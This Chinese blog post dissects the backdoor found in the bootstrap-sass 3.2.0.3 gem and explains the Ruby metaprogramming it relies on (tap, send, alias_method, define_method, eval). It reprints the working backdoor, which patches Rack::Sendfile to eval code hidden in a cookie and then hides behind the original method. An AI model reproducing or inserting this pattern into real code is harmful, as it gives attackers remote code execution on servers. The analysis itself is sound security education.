---
title:  "bootstrap-sass 3.2.0.3 黑客大佬用到的元编程"
toc: true
toc_label: "目录"
toc_icon: "cog"
tags: ruby gem cve
---

*tl; dr [**BKSpurgeon** 大佬的分析](https://github.com/twbs/bootstrap-sass/issues/1195#issuecomment-479756912)*

### 白帽大佬的分析

```ruby
begin
  require 'rack/sendfile'
  if Rails.env.production? # Continue only if we're in the rails production environment:

    Rack::Sendfile.tap do |r|
      # We're using the tap method. the block parameter, r, will be the Rack::Sendfile class.
      # So whenever you see r, just think we are working with the Rack::Sendfile class.

      r.send :alias_method, :c, :call
      # creates a method on Rack::Sendfile called `c` which reroutes to `call`.
      ## After the above you could now do:
      # send_file = Rack::Sendfile.new
      # send_file.c
      ## and the above would in turn call the ORIGINAL `call` method contained in the
      ## Rack::Sendfile class, and not the one that is being monkey patched below.
      ## `r.send` makes use of the `Object#send` method https://apidock.com/ruby/Object/send
      ## Another way of rewriting the above code would be:
      ## `Rack::Sendfile.alias_method(:c, :call)` which is equivalent to:
      ## `r.send :alias_method, :c, :call`

      ## The following bit of code below bit redefines the call(e) method which is in
      ## the SendFile class: https://github.com/rack/rack/blob/master/lib/rack/sendfile.rb
      ## again, `r.send(:define_method, :call) do |e|` is equivalent to saying:
      ## class Rack::Sendfile
      ##   def call(e)
      ##         # => Insert the malicious code below: begin....rescue...end
      ##   end
      ## end
      r.send(:define_method, :call) do |e|
        begin
          x = Base64.urlsafe_decode64(e['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
          # Please edit this if you are more knowledgeable:

          # gets the e['HTTP_COOKIE'] value out of there.
          # then it scans/looks for this for this value: ___cfduid and extracts it with
          # a regular expression.
          # we then get the entire string out of those cookie(s) and convert it to a string
          # then we unencode it and
          # "eval" simply runs whatever code it's been given, AS A STRING!
          # so that someone could simply construct a request with the malicious code,
          # hidden in a cookie and can run it on your server.
          # simplistically: I could send this: e("WIPE HARDRIVE")
          # and it would run, provided the security levels in eval are passed.
          eval(x) if x
        rescue Exception
        end

        c(e)
        # after we've done the dirty work, let's run the ORIGINAL `call` method, as
        # defined in the Rack::Sendfile class. so no one would be none the wiser.
        # in other words, we've created an aliased method `c`. Running `c`
        # runs the ORIGINAL `call` method, and not the monkey patched one above.
        # But if you run `call` instead of `c`, you will be actually running the tainted and
        # monkey patched `call` method above, and not the original `call` method defined.
        # in Rack::Sendfile. Like Kelley Wentworth says: "Sneaky, sneaky, sneaky!"
      end
    end
  end
rescue Exception
  nil
end
```

### 背景知识：tap

The primary purpose of this method is to “tap into” a method chain, in order to perform operations on intermediate results within the chain.

黑客大佬不修改 object 本身，用 tap 复制一份到 block 去加料

```ruby
(1..10).tap {|x| puts "original: #{x}" }
  .to_a.tap {|x| puts "array:    #{x}" }
  .select {|x| x.even? }.tap {|x| puts "evens:    #{x}" }
  .map {|x| x*x }.tap {|x| puts "squares:  #{x}" }
#original: 1..10
#array:    [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
#evens:    [2, 4, 6, 8, 10]
#squares:  [4, 16, 36, 64, 100]
```

### 背景知识：send

黑客大佬 send 了 alias_method、define_method，用来保存原来的方法，然后加料

```ruby
class Klass
  def hello(*args)
    puts "大家好 " + args.join(' ')
  end
end
k = Klass.new
k.send :hello, "我是渣渣辉", "我是陈咬春"
#大家好 我是渣渣辉 我是陈咬春
```

### 背景知识：alias_method

This can be used to retain access to methods that are overridden.

重写某个方法后，用 alias 可以访问原方法

```ruby
module Mod
  alias_method :orig_exit, :exit
  def exit
    print "加了料的 "
    orig_exit
  end

  def orig_exit
    puts "bootstrap-sass 官方出品"
  end
end
include Mod
exit
# 加了料的 bootstrap-sass 官方出品
```

### 背景知识：define_method

给类加/重写一个实例方法

```ruby
class A
  def fred
    puts "In Fred"
  end
  def create_method(name, &block)
    self.class.define_method(name, &block)
  end
  define_method(:wilma) { puts "Charge it!" }
end
class B < A
  define_method(:barney, instance_method(:fred))
end
a = B.new
a.barney
a.wilma
a.create_method(:betty) { p self }
a.betty
#In Fred
#Charge it!
##<B:0x00007f869f84e6f8>
```

### 背景知识：eval

eval 可以将（多个）字符串作为代码执行，详见 [Ruby 中的 eval 与 binding](http://wjp2013.github.io/ruby/eval-binding/)

```ruby
eval("p '拖库'; p '删库'; p '留下勒索信息'")
#"拖库"
#"删库"
#"留下勒索信息"
```

### Reference

[白帽大佬的分析](https://github.com/twbs/bootstrap-sass/issues/1195)

[Ruby 中的 eval 与 binding](http://wjp2013.github.io/ruby/eval-binding/)
